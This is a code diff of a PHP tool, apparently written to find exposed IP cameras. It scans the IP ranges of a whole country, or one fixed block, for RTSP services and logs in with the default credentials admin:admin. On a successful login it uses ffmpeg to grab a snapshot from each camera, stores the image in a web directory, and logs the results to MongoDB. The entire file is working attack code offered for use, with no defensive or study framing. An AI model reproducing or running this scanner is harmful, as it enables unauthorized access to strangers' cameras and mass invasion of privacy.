@@ -1,124 +1,151 @@
 <?php
 error_reporting(E_ERROR);
 set_time_limit(0);
-//echo "TCP/IP Connection\n";
-
-for($a=42;$a<=42;$a++){
-for($b=60;$b<=61;$b++){
-for($c=0;$c<=255;$c++){
-for($d=0;$d<=255;$d++){
-	$address = "$a.$b.$c.$d";
-	checking($address);
-}}}}
 
 
+//Exit if no country arg
+if(sizeof($argv) == 1) exit;
 
-function checking($address) {
+//Get country arg
+$country = $argv[1];
 
-/* Get the port for the rtsp service. */
-$service_port = getservbyname('rtsp', 'tcp');
+//Load IP address list by the country
+$ipList = getIpList($country);
 
-/* Create a TCP/IP socket. */
-$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-if ($socket === false) {
-    //echo "socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "\n";
-    unset($socket);    
-    return false;
-} 
+//Create pool
+$taskPool = new Pool(50);
 
-//socket_set_nonblock($socket);
-socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array('sec' => 1, 'usec' => 0));
-socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => 1, 'usec' => 0));
-
-$url = 'rtsp://'.$address.'/11';
-
-//echo "Attempting to connect to '$address' on port '$service_port'...\r\n";
-try{
-	$result = socket_connect($socket, $address, $service_port);
-} catch(Exception $e) {
-    unset($socket);
-	return false;
-}
-if ($result === false) {
-    unset($socket);
-	return false;
+//Loop IP List
+foreach($ipList as $ip) {
+	$ipArr = ipStrtoArray($ip);	
+	
+	for($a=$ipArr['start']['a']; $a <= $ipArr['end']['a']; $a++) {
+	for($b=$ipArr['start']['b']; $b <= $ipArr['end']['b']; $b++) {
+	for($c=$ipArr['start']['c']; $c <= $ipArr['end']['c']; $c++) {
+	for($d=$ipArr['start']['d']; $d <= $ipArr['end']['d']; $d++) {
+		$ip = $a.'.'.$b.'.'.$c.'.'.$d;				
+		//echo "Loop IP : ".$ip.PHP_EOL;
+		$taskPool->submit(new Task($ip));
+	}	
+	}
+	}		
+	}
+	
 }
 
-$in = "OPTIONS ".$url." RTSP/1.0\r\n";
-$in .= "CSeq: 1\r\n";
-$in .= "User-Agent: GStreamer/1.6.2\r\n";
-$in .= "ClientChallenge: 9e26d33f2984236010ef6253fb1887f7\r\n";
-$in .= "CompanyID: KnKV4M4I/B2FjJ1TToLycw==\r\n";
-$in .= "GUID: 00000000-0000-0000-0000-000000000000\r\n";
-$in .= "Date: Web, 31 Aug 2016 16:34:12 GMT\r\n\r\n";
+$taskPool->shutdown();
 
-$out = '';
+function ipStrToArray($ip){
 
-//echo "Sending RTSP HEAD request...";
-socket_write($socket, $in, strlen($in));
-//echo "OK.\n";
+	$ipArr = array();
+    $start = substr($ip,0,strpos($ip,','));
+    $end = substr($ip,strpos($ip,',')+1,sizeof($ip)-sizeof($start)-1);
 
-//echo "Reading response:\n\n";
-$out = socket_read($socket, 2048);
-//echo $out;
+	$ipArr['start']['a'] = substr($start,0,strpos($start,'.'));
+	$start = substr($start,strpos($start,'.')+1);
+	$ipArr['start']['b'] = substr($start,0,strpos($start,'.'));
+	$start = substr($start,strpos($start,'.')+1);
+	$ipArr['start']['c'] = substr($start,0,strpos($start,'.'));
+	$ipArr['start']['d'] = substr($start,strpos($start,'.')+1);
 
-$in = "DESCRIBE ".$url." RTSP/1.0\r\n";
-$in .= "CSeq: 2\r\n";
-$in .= "User-Agent: GStreamer/1.6.2\r\n";
-$in .= "Accept: application/sdp\r\n";
-$in .= "Date: Web, 31 Aug 2016 16:34:12 GMT\r\n\r\n";
-$out = '';
+    $ipArr['end']['a'] = substr($end,0,strpos($end,'.'));
+    $end = substr($end,strpos($end,'.')+1);
+    $ipArr['end']['b'] = substr($end,0,strpos($end,'.'));
+    $end = substr($end,strpos($end,'.')+1);
+    $ipArr['end']['c'] = substr($end,0,strpos($end,'.'));
+    $ipArr['end']['d'] = substr($end,strpos($end,'.')+1);
 
-//echo "Sending RTSP HEAD request...";
-socket_write($socket, $in, strlen($in));
-//echo "OK.\n";
+	return $ipArr;
 
-//echo "Reading response:\n\n";
-$out = socket_read($socket, 2048);
-//echo $out;
-
-$realm = substr($out,strpos($out,'realm="')+7);
-$realm = substr($realm,0,strpos($realm,'"'));
-//echo "realm : ".$realm."\n";
-
-$nonce = substr($out,strpos($out,'nonce="')+7);
-$nonce = substr($nonce,0,strpos($nonce,'"'));
-//echo "nonce : ".$nonce."\n";
-
-$ha1 = md5("admin:".$realm.":admin");
-$ha2 = md5("DESCRIBE:".$url);
-$response = md5($ha1.":".$nonce.":".$ha2);
-//echo "response : ".$response."\n";
-
-$in = "DESCRIBE ".$url." RTSP/1.0\r\n";
-$in .= "CSeq: 3\r\n";
-$in .= "User-Agent: GStreamer/1.6.2\r\n";
-$in .= "Accept: application/sdp\r\n";
-$in .= "Authorization: Digest username=\"admin\", ";
-$in .= "realm=\"".$realm."\", ";
-$in .= "nonce=\"".$nonce."\", ";
-$in .= "uri=\"".$url."\", ";
-$in .= "response=\"".$response."\"\r\n";
-$in .= "Date: Web, 31 Aug 2016 16:34:12 GMT\r\n\r\n";
-
-//echo "Write $in";
-
-//echo "Sending RTSP HEAD request...";
-socket_write($socket, $in, strlen($in));
-//echo "OK.\n";
-
-//echo "Reading response:\n\n";
-$out = socket_read($socket, 2048);
-//echo $out;
-if(strpos($out,"200 OK")>0) {
-	echo $url."\r\n";
 }
 
-//echo "Closing socket...";
-socket_close($socket);
-//echo "OK.\n\n";
+function getIpList($country) {
+	$country = urlencode($country);
+	$ch = curl_init();	
+	curl_setopt($ch, CURLOPT_URL, "http://services.ce3c.be/ciprg/?countrys=".$country."&format=by+input&format2=%7Bstartip%7D%2C%7Bendip%7D%0D%0A");	
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	$data = curl_exec($ch);
+	curl_close($ch);
+	return explode(PHP_EOL,$data);
+}
 
-unset($socket);
+class Task extends Threaded {
+	
+	private $ip;
+	
+	public function __construct($ip) { 
+		$this->ip = $ip;			
+		//echo "Worker Thread Init IP : ".$this->ip." [OK]".PHP_EOL;
+	}
+	
+	public function run() {	
+					
+		//echo "Worker Thread Run IP : ".$this->ip." [Start]".PHP_EOL;
+		
+		$doc = array();
+
+		$doc = $this->rtsp($doc);
+		
+		$this->update_db($doc);				
+		
+		//echo "Worker Thread run IP : ".$this->ip." [End]".PHP_EOL;	
+		
+		$this->setGarbage();	
+	}	
+	
+	private function rtsp($doc) {	
+		$user = 'admin';
+		$pw = 'admin';
+		$req = '11';
+		$link = "rtsp://".$user.":".$pw."@".$this->ip."/".$req;		
+		$cmd = "ffmpeg -stimeout 2000000 -i "
+			.$link." "
+			."-f image2 -vframes 1 -y "
+			."/var/www/html/ipcam/pic/".$this->ip.".jpeg 2>&1"; 		
+		$output = shell_exec($cmd);		
+		$doc['ip'] = $this->ip;
+		$doc['link'] = $link;
+		$doc['capture_timestamp'] = new MongoDB\BSON\UTCDateTime(strtotime(date('Y-m-d H:i:s')) * 1000);  
+		$doc['capture_result'] = $this->setDocResult($output);
+												
+		return $doc;
+	}
+	
+	private function update_db($doc) {
+		//Connect to database
+		// This path should point to Composer's autoloader
+		require 'vendor/autoload.php';			
+		$client = new MongoDB\Client("mongodb://localhost:27017");
+		$collection = $client->ipcam->capture_list;				
+		
+		//Find record on DB
+		$entry = $collection->findOne(['ip' => $this->ip]);
+		if($entry) {
+			$collection->updateOne(
+				[ '_id' => $entry['_id'] ],
+				[ '$set' => $doc ]
+			);
+		} else {
+			$collection->insertOne($doc);
+		}	
+	}	
+ 	
+	private function setDocResult($output) {
+		if(strpos($output,'Connection timed out') > 0) {
+			return 'Connection timeout';		//Host offline	
+		} else if(strpos($output,'Connection refused') > 0) {
+			return 'Connection refused';		//Host online but no RSTP
+		} else if(strpos($output,'400 Bad Request') > 0) {
+			return '400 Bad Request';			//RTSP ok but bad request	
+		} else if(strpos($output,'401 Unauthorized') > 0) {
+			return '401 Unauthorized';			//RTSP & request ok but incorrect password
+		} else if(strpos($output,'Invalid data found') > 0) {
+			return 'Invalid data found'; 		//Invalid data found
+		} else if(strpos($output,'Output #0, image2, to') > 0){
+			return 'Success'; 					//Connect success
+		}
+		return $output;
+	}
 }
 
 ?>
